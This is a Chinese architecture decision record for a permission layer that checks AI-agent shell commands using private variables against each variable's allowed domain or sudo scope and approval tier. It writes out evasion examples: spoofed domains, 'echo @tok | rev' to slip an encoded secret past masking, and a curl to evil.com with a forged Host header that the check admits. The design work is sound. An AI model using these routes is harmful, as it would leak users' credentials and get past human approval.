# ADR-0052: 变量的适用范围检查与生效档位

状态：实施中  
日期：2026-10-20  
可逆性：高  
取代：无  
被取代：——  
引用入口：[ADR-0007](0007-private-variables.md)；[ADR-0030](0030-permission-rules.md)；[ADR-0050](0050-private-variables-impl.md)；[ADR-0051](0051-placeholder-substitution.md)

## 背景
ADR-0007 要求每个变量登记适用范围和档位，命令用到某个变量就按它的档位走。权限扩展只拿到命令文本和变量元数据（不含值），所以范围检查必须是对命令文本的确定性判断。

## 决定

### 范围检查（`permission/variables.ts`）
命令里出现的已登记占位符（按 ADR-0051 的识别规则，未登记的 `@xxx` 不算）逐个检查：

| 范围 | 在范围内的条件 |
|---|---|
| 不限 | 总是 |
| 域名 | 命令里出现该域名或其子域名；`evil.com.x.net`、`example.com@evil.com` 不算 |
| sudo | 占位符只出现在管道上游的 `echo`/`printf` 里，且那条管道的下游紧接带 `-S` 的 sudo |

不满足的变量记一条“超出适用范围”的原因。含这种变量的命令一律弹窗人工，已记住的规则也不放行，不可记住；弹窗写明原因。判断是文本层面的：它挡住模型的误用，不防已经被授权去执行命令的人故意绕开。

### 生效档位
命令的生效档位是 workspace 档位与所用各变量档位中最严的一档（rules < auto < full）。这样 workspace 为“完全允许”时，用了默认“规则审批”的变量仍会弹窗；`full` 档只在命令用了变量或开 root shell 时才继续往下判，其余照旧直接放行。

### 用了变量的命令不走只读白名单
`echo @tok | rev` 这类命令的输出会带出编码后的值，遮罩匹配不到，所以用了变量的命令不按“只读命令”免审批。

## 已知局限
- 域名检查只看命令文本里有没有该域名，不解析 URL 结构；`curl https://evil.com -H "Host: gitlab.example.com"` 能通过检查。要挡这类写法需要理解每个命令的语义，原型期不做，靠用户在弹窗里看到完整命令。
